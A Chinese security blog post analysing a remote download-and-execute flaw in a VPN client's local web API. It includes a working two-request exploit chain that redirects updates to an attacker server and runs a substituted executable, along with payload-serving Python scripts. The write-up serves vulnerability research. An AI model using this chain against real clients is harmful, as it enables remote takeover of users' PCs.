---
layout: post
author: Vulkey_Chen
title: "某VPN客户端远程下载文件执行模拟逆向分析"
date: 2021-05-05
music-id: 1813864802
permalink: /archives/2021-05-05/1
description: "某VPN客户端远程下载文件执行模拟逆向分析"
---

# 某VPN客户端远程下载文件执行模拟逆向分析

## 前言

2021年3月，我通过黑盒的方式挖掘出某VPN客户端的远程下载文件执行漏洞，其原理就是通过VPN客户端本身所开启的Web服务API接口修改客户端更新请求地址，继而通过API控制客户端程序进行自动请求更新，导致客户端下载我自定义的更新程序，并运行。

黑盒侧的漏洞挖掘往往带有许多的不确定性，所以我尝试从白盒（逆向）侧的角度去入手分析该漏洞的形成，并以此为基础形成对这种漏洞的挖掘模型记忆。

**注**：文中可能会存在笔误或描述不准确等错误，还望各位不吝赐教，多多斧正。

## 黑盒侧

在正式逆向之前，建议读者先阅读一下黑盒侧的漏洞挖掘过程，如若读者已经熟知该漏洞，可越过该章节直接阅读「逆向侧」章节内容。

### 漏洞回顾

随便找一个地方下载VPN客户端下载安装。

安装完之后访问VPN的页面，发现VPN会自动下载组件更新：

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/Pasted%20image%2020211010234406.png)

这之间也许是因为存在着某些联系，可以深入的看一下。

#### 对本地的访问

重现上述问题，通过`F12`发现当访问VPN的登陆页面会对本地`127.0.0.1`进行HTTP(s)请求：

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/Pasted%20image%2020211010234412.png)

这些请求均为GET请求并附带着一些参数，我把它一一列下来：

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/Pasted%20image%2020211010234418.png)

本地来看一下这个`54530`端口对应的进程是什么：

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/Pasted%20image%2020211010234423.png)

发现这个端口是ECAgent.exe开启的，寻找到对应进程文件所在位置：

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/Pasted%20image%2020211010234430.png)

确认这是XXX SSLVPN的程序，那么就可以将两者联系到一起，访问VPN登录首页会触发对`127.0.0.1`的访问从而引起VPN进行组件更新。

#### 更新地址可控

通过以上的分析可以猜测整个大致流程，但我设想一下如果我可以控制本地的更新指向我的服务器，然后将更新的组件内容替换成恶意程序，当程序启动的时候就启动了恶意程序，这样我可以拿到安装VPN客户端的使用者PC权限。

再回到之前的本地链接列表，根据对英文的理解，参数op的值应该为其具体对应要执行的动作：

```
InitECAgent -> 初始化
GetEncryptKey -> 获取加密密钥
DoConfigure -> 配置
CheckReLogin -> 检查重新登录
CheckProxySetting -> 检查代理设置
UpdateControls -> 更新控制
DoQueryService -> 查询服务
```

第一个初始化的请求存在可控参数arg1：

```
https://127.0.0.1:54530/ECAgent/?op=InitECAgent&arg1=XXX%20443&callback=EA_cb10000
```

参数`arg1=XXX%20443`，对应值也就是HOST+空格+端口的格式，看到这里基本上就会有一个思路，客户端更新控件是不是根据这个指定值向其发送请求更新的呢？我可以只替换第一个初始化请求的arg1参数为`172.20.10.2 8000`，然后本地搭建一个HTTP服务：

```python
python -m SimpleHTTPServer
```

其他的请求原封不动，依次请求一遍那一份URL列表（图为请求示例）：

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/Pasted%20image%2020211010234440.png)

服务端成功收到请求，但是却出现了错误的提示：

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/Pasted%20image%2020211010234445.png)

首先我已经验证了自己的猜想，更新地址是自己可控的，客户端确实会向我指定的服务端发送请求，但由于出现了错误，我不知道客户端访问了哪个文件，也不知道访问文件之后做了什么动作。

#### 服务搭建

现在要做的就是搭建一个客户端可以正常访问的请求，通过这个错误大致可以知道，我搭建的服务端协议和客户端请求使用的协议不一致，本机抓个包发现客户端请求的是 HTTPS 协议，这就需要搭建一个 HTTPS 服务了。

如下脚本基于Python库建立一个 HTTPS 服务：

```python
# openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes

import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 8000), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
```

搭建起一个 HTTPS 环境后再次复现如上请求，服务端收到日志：

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/Pasted%20image%2020211010234455.png)

可以看见客户端会访问两个文件：

```
/com/WindowsModule.xml
/com/win/XXXUD.exe
```

先不管xml文件是怎么样的，可执行文件(exe)是需要重视的，但是这里通过提示可以看出客户端发出的请求是POST请求，但我所写的Python脚本建立的HTTPS服务并不支持POST方法，我需要重写一下Handler：

```python
import BaseHTTPServer
import SimpleHTTPServer
import cgi
import ssl

class ServerHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_POST(self):
        form = cgi.FieldStorage()
        SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)

Handler = ServerHandler

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 8000), Handler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
```

最终如上脚本支持`POST`方法，当时用`POST`方法请求时即返回文件内容。

最后，拖一个`calc.exe`（计算器）到HTTPS网站根目录下的`/com/win/XXXUD.exe`。

依次请求（**经过多次复现发现，这三个请求才是重点的，其他的可以忽略**）：

```http
https://127.0.0.1:54530/ECAgent/?op=InitECAgent&arg1=172.20.10.2 8000&callback=EA_cb10000

https://127.0.0.1:54530/ECAgent/?op=CheckReLogin&arg1=3408a894633162c62188f98e92a221967dccfa5aafbd79b576714b4d1c392a4ad4b220d698efcd939c3b1b37467023e9380ee3abf0e492ee2efc736de757b80e973fe4c7d8af1af211a3f7ff3433cd9de975c76583efe7251dd1c0656f4384832998630359b65beb131cd8d287712462fa1b9e9acbc96dcc678b84cd57178c1a&token=50065256e83ff1bb9e01757d0d22b669&callback=EA_cb10003

https://127.0.0.1:54530/ECAgent/?op=UpdateControls&arg1=BEFORELOGIN&callback=EA_cb10005
```

会发现客户端请求之后，将文件下载到本地并启动该程序，成功弹出计算器：

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/Pasted%20image%2020211010234504.png)

## 白盒（逆向）侧

我从白盒（逆向）侧的角度，带入Web漏洞挖掘思维，在不完全分析伪代码的情况下**推理**出漏洞。（仅尝试带入，非实战，不喜勿喷）

### HTTP服务的建立

#### 确定进程

首先进行某客户端程序的安装并启动客户端程序，然后需要使用Process Hacker之类的工具查看进程树，根据某独有的特征关键词`XXX`找到打开的进程。

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/Pasted%20image%2020220302092752.png)

接着根据进程查看其是否启用了网络服务（端口开放），我找到了`ECAgent.exe`这个进程，并且观察到其启用了`54530`端口：

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/Pasted%20image%2020220301141006.png)

尝试以HTTP/HTTPS形式访问该端口，发现HTTPS访问有具体返回内容：

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/Pasted%20image%2020220302093515.png)

故此判断该进程所启用端口为HTTP服务。

#### 寻找入口

现在需要找到程序开启HTTP服务的入口点，由此才能继续去跟进整个程序的逻辑，我第一时间想到的是加载的DLL文件，选择x32dbg附加进程查看其所加载的DLL文件：

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/Pasted%20image%2020220302132429.png)

这里有很多系统的DLL文件，可以略过，优先查看与`ECAgent.exe`有关联性的DLL文件，例如其同级目录下的几个DLL（也都被加载了）：

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/Pasted%20image%2020220302132839.png)

通过IDA打开这些DLL文件，并使用关键词`127.0.0.1`、`0.0.0.0`、`54530`搜索相关数据，找到对应使用的代码（F5伪代码，如下图中函数地址不一致时因为我在调试过程中进行了REBASE）：

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/Pasted%20image%2020220301141941.png)

如上图代码中，很明显这是WINSOCK编程的写法，其中的结构体`sockaddr`实际上等价于`sockaddr_in`，二者唯一的区别是`sockaddr_in`结构体有明确的成员去指定IP、端口，而`sockaddr`结构体则是使用成员`sa_data`（这是一个数组）去包含IP、端口之类的信息。

如下图所示，就是一个两结构体之间的对应图，端口存放在`sa_data`的第0、1位，IP存放在`sa_data`的第2、3、4、5位：

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/Pasted%20image%2020220302134038.png)

但是在这里，实际环境中的代码对应的端口居然为0，实际测试，发现这样的赋值是无法创建成功的：

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/Pasted%20image%2020220302134453.png)

我陷入了沉思，莫非是找错位置了？并不是这个DLL文件去开启的Web服务？带着这一份沉思去找了很多个DLL，发现它们要么是0，要么就是其他端口，而不是对应的`54530`。

在不断的试错之后，我发现了自己从未去看过`ECAgent.exe`本身，而尝试去`ECAgent.exe`搜索字符串时，也没有什么收获，于是想着既然一个DLL中用到了WINSOCK的库去创建SOCKET，那么应该都会这样去编写，所以尝试使用创建SOCKET服务特有的函数名`bind`去全局搜索，搜索结果如下图所示：

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/Pasted%20image%2020220302135614.png)

接下来就是一个一个函数跟进去查看，最终我发现了它`sub_47FD60`，如下图所示，`sub_47FD60`是创建SOCKET的函数，但是绑定的端口是入参，所以我需要找到调用该函数的函数，也就是`sub_47FEB0`，这个函数会使用一个循环，入参的端口也会随着循环递增（应该是为了防止端口冲突的情况），当创建SOCKET成功之后就直接返回。

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/Pasted%20image%2020220302140849.png)

将这段伪代码编译执行一下，输出结果，就发现第一个入参的端口是`54530`，并且理论上不会有其他的软件占用这个端口，所以，我认为`ECAgent.exe`的HTTP服务端口就是`54530`。

### 接口参数的处理逻辑

分析完HTTP服务的建立之后，我想要知道其具体如何处理请求参数，可以在此函数基础上继续回溯追踪调用链，但是这样的工作量是巨大的，不适合快速分析，所以我首先根据HTTP服务的响应字符串于IDA中搜索，再根据字符串的XREF，找到其对应使用到的函数：

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/Pasted%20image%2020220302180222.png)

如上图所示代码，大概意思就是有一个数组，存入了字符串和函数地址，根据入参进行类似对比，而后去调用函数。

在这里第二个参数`a2`至关重要（它在条件判断、函数入参中都被使用到），所以我接着跟该函数的XREF，找到传递参数`v26`：

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/Pasted%20image%2020220303093911.png)

跟进处理过`v26`的函数，`sub_48E2C0`函数打开了世界的大门，根据其函数的输出字符串和代码，此函数大概表达意思就是去解析URL中的请求参数：

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/Pasted%20image%2020220303094307.png)

所以，这里我就可以列出这几个参数：

```
op
token
callback
guid
```

将参数带入URL中，分别加上`123`参数值去访问：

```
https://127.0.0.1:54530/?op=123
https://127.0.0.1:54530/?token=123
https://127.0.0.1:54530/?callback=123
https://127.0.0.1:54530/?guid=123
```

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/Pasted%20image%2020220303100233.png)

如上图所示，请求参数`callback`有对应的反回信息，尝试进行XSS无果，接着在IDA中搜索`callback`字符串找找是否有对应的逻辑，发现了多个URL的地址：

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/Pasted%20image%2020220303102028.png)

这些URL地址证明了参数`op`、`token`、`callback`可以搭配在一块去请求使用，我于此处逐渐递减参数访问（考虑到`token`参数可能会存在鉴权等操作）：

```
https://127.0.0.1:54530/?op=__restart_ecagent__&token=123&callback=123
https://127.0.0.1:54530/?op=__restart_ecagent__&token=123
https://127.0.0.1:54530/?op=__restart_ecagent__
```

最终发现，这三条请求都可以使得`ECAgent.exe`进程重启，而`op=__stop_ecagent__`则测试可以停止`ECAgent.exe`进程。

#### 输入参数

简单梳理完接口参数的处理逻辑之后，我对`op`值对应的函数都看了下，有很多函数无法通过静态的方式去分析，但根据字面意思也能理解个大概：

```c
v7 = "__check_alive__";
v8[0] = (int)sub_48F700;
v8[1] = (int)"CheckRelogin"; // 检查重新登录
v8[2] = (int)sub_4935E0;
v8[3] = (int)"DoConfigure"; // 做配置
v8[4] = (int)sub_490800;
v8[5] = (int)"GetConfig"; // 获取配置
v8[6] = (int)sub_48FB30;
v8[7] = (int)"InitECAgent"; // 初始化ECAgent
v8[8] = (int)sub_48F720;
v8[9] = (int)"GetEncryptKey"; // 获取加密key
v8[10] = (int)sub_493540;
v8[11] = (int)"Setter";
v8[12] = (int)sub_493960;
v8[13] = (int)"Getter";
v8[14] = (int)sub_494190;
v8[15] = (int)"__restart_ecagent__"; // 重启ECAgent
v8[16] = (int)sub_4903E0;
v8[17] = (int)"__stop_ecagent__"; // 停止ECAgent
v8[18] = (int)sub_491510;
v8[19] = (int)"DetectECAgent"; // 检测ECAgent
v8[20] = (int)sub_48F6C0;
```

但有些操作肯定是需要另外一个参数去赋值配合的，所以我根据之前获取的参数列表在IDA中搜索字符串，我发现在这些参数中夹杂着一个双字`dd -> Define Double Word`，IDA没有将它直接解析出来：

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/Pasted%20image%2020220304094407.png)

我选中它按下快捷键`A`将其转为字符串形式，得到了字符串`arg`：

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/Pasted%20image%2020220304095308.png)

既然是与参数在一块的，那么我也将其作为参数添加到URL中，并与添加参数之前的URL，分别请求对比响应：

```
https://127.0.0.1:54530/?op=CheckRelogin
https://127.0.0.1:54530/?op=DoConfigure
https://127.0.0.1:54530/?op=GetConfig
https://127.0.0.1:54530/?op=InitECAgent
https://127.0.0.1:54530/?op=GetEncryptKey

https://127.0.0.1:54530/?op=CheckRelogin&arg=123
https://127.0.0.1:54530/?op=DoConfigure&arg=123
https://127.0.0.1:54530/?op=GetConfig&arg=123
https://127.0.0.1:54530/?op=InitECAgent&arg=123
https://127.0.0.1:54530/?op=GetEncryptKey&arg=123
```

CheckRelogin，添加前提示`invalid param count`，添加后就不提示：

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/Pasted%20image%2020220304111032.png)

DoConfigure，添加前返回为空，添加后返回有内容：

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/Pasted%20image%2020220304111231.png)

GetConfig，添加前返回有内容，添加后返回为空：

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/Pasted%20image%2020220304111325.png)

InitECAgent，添加前返回为空，添加后返回有内容，并提示`CSCM_EXIST, init ok`：

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/Pasted%20image%2020220304111430.png)

GetEncryptKey，添加前后返回内容没有变化：

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/Pasted%20image%2020220304132748.png)

根据对比， `arg`确实可以作为参数去请求，但具体是什么意义，还需要去看功能实现，由于我水平有限，在阅读静态代码时遇到很多坎，所以根据自己的大概理解，判断出该程序会输出Log日志。

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/Pasted%20image%2020220304112207.png)

于是在磁盘文件中去寻找Log文件，最终在`C:\Users\chen\AppData\Roaming\XXX\SSL\Log`中找到了输出日志：

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/Pasted%20image%2020220304112256.png)

根据`ECAgent.exe.log`日志记录可以看出程序处理的逻辑：

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/Pasted%20image%2020220304112633.png)

1. CheckRelogin对arg参数进行了解密；
2. GetConfig根据arg参数进行读取配置；
3. InitECAgent根据arg参数配置了VPN地址（HTTPS）。

CheckRelogin解密正好对应着GetEncryptKey的返回加密信息，于是尝试带入并根据日志发现记录的信息不一样了，所以在这里我暂时将其搁置：

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/Pasted%20image%2020220304133139.png)

接着来看配置VPN客户端的服务地址，尝试请求如下地址，将服务器地址指向我的机器：

```
https://127.0.0.1:54530/?op=InitECAgent&arg=172.20.10.3
```

随后去请求其他`op`参数值的地址，偶然间发现请求如下地址（GetConfig的arg参数为0或字符串）：

```
https://127.0.0.1:54530/?op=GetConfig&arg=abc
```

VPN客户端会去请求`https://172.20.10.3/com/WindowsModule.xml`，如下图所示就是客户端请求服务端的HTTP日志：

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/Pasted%20image%2020220304125709.png)

并且会将该文件的XML格式转为JSON格式输出：

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/Pasted%20image%2020220304125819.png)

#### 其他动作

按照正常逻辑来说，既然可以远程读取服务器配置，应该会有一些其他的操作，例如更新、下载，于是我在IDA中继续寻找，发现了一段字符串：

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/Pasted%20image%2020220304131819.png)

```c
v23 = "__check_alive__|GetEncryptKey|DoConfigure#SET LANG|DoQueryService#QUERY LANG|InitECAgent|CheckRelogin|Logout|CheckMITMAttack|SelectLines|DetectECAgent|CheckProxySetting|UpdateControls#BEFORELOGIN|DoQueryService#QUERY CONTROLS UPDATEPROCESS|DoQueryService#QUERY DKEY_DETECT|DoQueryService#QUERY LOGINSTATUS|OpenBrowser|StartEasyConnect|DoQueryService#QUERY NEEDUPDATE";
```

在该字符串中许多之前发现的都存在其中，当然也有很多没有见过的，我梳理了一下没有见过的字符串：

```
DoConfigure#SET LANG
DoQueryService#QUERY LANG
Logout
CheckMITMAttack
SelectLines
CheckProxySetting
UpdateControls#BEFORELOGIN
DoQueryService#QUERY CONTROLS UPDATEPROCESS
DoQueryService#QUERY DKEY_DETECT
DoQueryService#QUERY LOGINSTATUS
OpenBrowser
StartEasyConnect
DoQueryService#QUERY NEEDUPDATE
```

很奇怪的是这些字符串之后还有一个`#`号，例如`DoConfigure`，按照我的推测是去设置配置信息的，此处后面跟了一个`#`号+`SET LANG`，根据字面意思第一时间想到了这可能是设置语言，但如何设置？尝试了一下，此处可以带进`arg`参数，按照字面意思`SET LANG`之后应该还需要有参数值，所以请求参数值改为`SET LANG 123`，接着按照字面意思发现配合`DoQueryService#QUERY LANG`可以查询出来：

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/Pasted%20image%2020220304135649.png)

同样，我在之前的发现中发现可以去配置VPN服务IP地址，在IP之后加上空格也可以配置指定端口：

```
https://127.0.0.1:54530/?op=InitECAgent&arg=172.20.10.3 443
```

### 远程下载（RCE）

接着来看我最关心的`UpdateControls#BEFORELOGIN`，其字面意思就是在登陆前进行更新，那么具体更新了什么呢？我尝试请求如下URL并查看是否存在网络的连接（需要先请求InitECAgent）：

```
https://127.0.0.1:54530/?op=UpdateControls&arg=BEFORELOGIN
```

在HTTP服务端成功的收到了请求日志，可以看见客户端请求了很多个路径，并以POST形式请求了`/com/win/XXXUD.exe`文件：

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/Pasted%20image%2020220304144029.png)

经过测试发现其会去主动下载该EXE并替换原XXXUD.exe文件，接着执行打开：

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/Pasted%20image%2020220304144714.png)

就这样我成功发现了一条RCE链：

```
// 改变VPN客户端服务的IP地址和端口
https://127.0.0.1:54530/?op=InitECAgent&arg=172.20.10.3 443
// 让VPN客户端发起下载更新，并执行更新文件
https://127.0.0.1:54530/?op=UpdateControls&arg=BEFORELOGIN
```

## 文末

我在真实逆向过程中踩了很多坑，也由于自身缺少逆向经验和强有力的水准，只能模拟黑盒的经验和套路带入到逆向中。

虽然这只是一次逆向挖掘模拟，但在这过程中我掌握了之前黑盒所无法知晓的细节，并且对比黑、白盒的过程和结果，会发现逆向侧最后实际的PoC根本不需要`/ECAgent/`目录，`arg1`参数也变成了`arg`参数，并且RCE链的请求，从原本的3条请求变成了2条请求。（也许可以Bypass一些WAF）

最后我将这类漏洞称之为Web2Pwn，也就是基于Web通道达到应用侧（非Web）漏洞触发的目的。例如你可以通过HTTP服务访问触发执行CreateProcess函数，亦或者通过HTTP服务访问触发溢出漏洞。